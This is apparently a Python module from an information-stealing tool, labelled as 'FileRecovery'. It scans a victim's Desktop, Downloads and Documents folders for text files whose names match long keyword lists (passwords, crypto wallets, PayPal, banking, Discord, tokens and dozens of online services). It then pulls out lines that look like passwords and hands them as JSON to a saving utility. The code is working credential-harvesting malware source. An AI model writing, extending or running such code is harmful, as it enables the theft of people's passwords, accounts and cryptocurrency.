import os
import threading
import logging
import json
from Utilities.DataSaver import DataSaverUtility
import string

logging.basicConfig(level=logging.INFO)

class FileRecovery:

    KEYWORDS_FOLDERS = [
        "account", "acount", "passw", "secret"
    ]

    KEYWORDS_FILES = [
        "passw", "mdp", "motdepasse", "mot_de_passe", "login", "secret", "account", 
        "acount", "paypal", "banque", "metamask", "wallet", "crypto", "exodus", 
        "discord", "2fa", "code", "memo", "compte", "token", "backup"
    ]

    ADDITIONAL_KEYWORDS = [
        'mail', 'coinbase', 'sellix', 'gmail', 'steam', 'discord', 'riotgames', 
        'youtube', 'instagram', 'tiktok', 'twitter', 'facebook', 'card', 'epicgames', 
        'spotify', 'yahoo', 'roblox', 'twitch', 'minecraft', 'bank', 'paypal', 'origin', 
        'amazon', 'ebay', 'aliexpress', 'playstation', 'hbo', 'xbox', 'buy', 'sell', 
        'binance', 'hotmail', 'outlook', 'crunchyroll', 'telegram', 'pornhub', 'disney', 
        'expressvpn', 'crypto', 'uber', 'netflix'
    ]

    DIRECTORIES_TO_CHECK = [os.path.expanduser(p) for p in ["~/Desktop", "~/Downloads", "~/Documents"]]

    def __init__(self):
        self.files_found = []

    def is_potential_password(self, line: str) -> bool:
        """Checks if a given line can be a potential password."""
        return (5 <= len(line) <= 64) and (' ' not in line) and (any(c in string.ascii_letters for c in line) and any(c.isdigit() for c in line))

    def search_folder(self, path: str, keywords: list):
        try:
            #logging.info(f"Searching in directory: {path}")
            files = os.listdir(path)
            for file in files:
                if os.path.isfile(os.path.join(path, file)) and any(keyword in file.lower() for keyword in keywords) and file.endswith('.txt'):
                    with open(os.path.join(path, file), 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.readlines()
                        potential_passwords = [line.strip() for line in content if self.is_potential_password(line.strip())]
                        if potential_passwords:
                            self.files_found.append({
                                "path": os.path.join(path, file),
                                "content": potential_passwords
                            })
                            #logging.info(f"Found potential password in: {os.path.join(path, file)}")
        except Exception as e:
            logging.error(f"Error while searching in directory {path}: {e}")

    def start_search(self):
        threads = []

        # Combine the standard and additional keywords
        combined_keywords = set(self.KEYWORDS_FILES + self.ADDITIONAL_KEYWORDS)

        for dir_path in self.DIRECTORIES_TO_CHECK:
            if os.path.exists(dir_path):
                t = threading.Thread(target=self.search_folder, args=(dir_path, combined_keywords))
                threads.append(t)
                t.start()
        
        for t in threads:
            t.join()

    def format_files(self) -> str:
        """Formats the list of files and their content into a desired structure."""
        formatted_data = []
        for file in self.files_found:
            file_entry = {
                "Type": "Sensitive Files",
                "FileName": os.path.basename(file["path"]),
                "FilePath": file["path"],
                "PotentialPasswords": file["content"]
            }
            formatted_data.append(file_entry)

        return json.dumps(formatted_data, indent=4)

    def recover_sensitive_files(self):
        """Initiates the recovery of sensitive files based on keywords."""
        self.start_search()

        if not self.files_found:
            logging.warning("No files with sensitive keywords found.")
            return

        # Use the utility to save the formatted files and their content
        formatted_data = self.format_files()
        DataSaverUtility.save_to_file(formatted_data)